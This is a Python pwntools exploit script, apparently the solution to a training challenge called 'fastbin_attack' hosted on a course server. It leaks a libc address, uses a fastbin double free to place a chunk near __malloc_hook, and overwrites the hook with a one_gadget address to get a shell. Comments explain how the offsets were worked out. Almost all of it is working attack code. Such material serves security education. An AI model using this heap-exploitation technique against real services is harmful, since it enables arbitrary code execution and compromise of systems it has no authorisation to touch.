from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./fastbin_attack")
    gdb.attach(r, '''
               #b read
               c
               ''')
    input("wait")
else:
    r = remote("bin.training.offdef.it", 10101)

def alloc(size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(b"%d" % size)
    r.recvuntil(b"index ")
    index = int(r.recvuntil(b"!")[:-1])
    return index

def write(index, data):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index )
    r.recvuntil(b"Content: ")
    r.send(data)
    r.recvuntil(b"Done")

def read(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index )
    data = r.recvuntil(b"\nOptions:")[:-len(b"\nOptions:")]
    return data

def free(index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index )
    r.recvuntil(b"freed!\n")

# leak = u64(leak.ljust(8, b"\x00"))
# use vmmap and find libc_address
# use python3: LIBC_OFFSET = hex(leak - libc_adddress)
# use 'p &__malloc_hook' or 'p &__free_hook' to find the addresses 
# and check in the neighborhood (atually before the malloc/free) 
# if we can find some values that match
# the size of our bins ([!] only check is done when free())
# calculate '0x23' = hex(malloc_hook - address of a valid chunck with suitable size)
# calculate offset for the malloc_hook '0x3c4b10' = hex(malloc_hook - libc_address using vmmap)

LIBC_OFFSET = 0x3c4b78
malloc_hook = 0x7f143e3c4b10
MALLOC_HOOK_OFFSET = 0x3c4b10

LIBC = ELF("./libc-2.23.so")

alloc(0x100)
alloc(0x20)
free(0)
leak = read(0)
LIBC.address = u64(leak.ljust(8, b"\x00")) - LIBC_OFFSET
print(hex(LIBC.address))

#create a loop use double free
a = alloc(0x60)
b = alloc(0x60)
free(a)
free(b)
free(a)
c = alloc(0x60)
write(c,p64(LIBC.symbols["__malloc_hook"]- 0x23))
print(hex(LIBC.symbols["__malloc_hook"]- 0x23))

alloc(0x60)
alloc(0x60)

#overwrite malloc_hook
d = alloc(0x60)
# to calculate the padding 0x23 - 0x10 of metadata
ONE_GADGET = 0xf1247
write(d, b"A"*0x13 + p64(LIBC.address + ONE_GADGET))


#Manually allocate the last one 1) Alloc entry, size ex. 20, then exploit complete

r.interactive()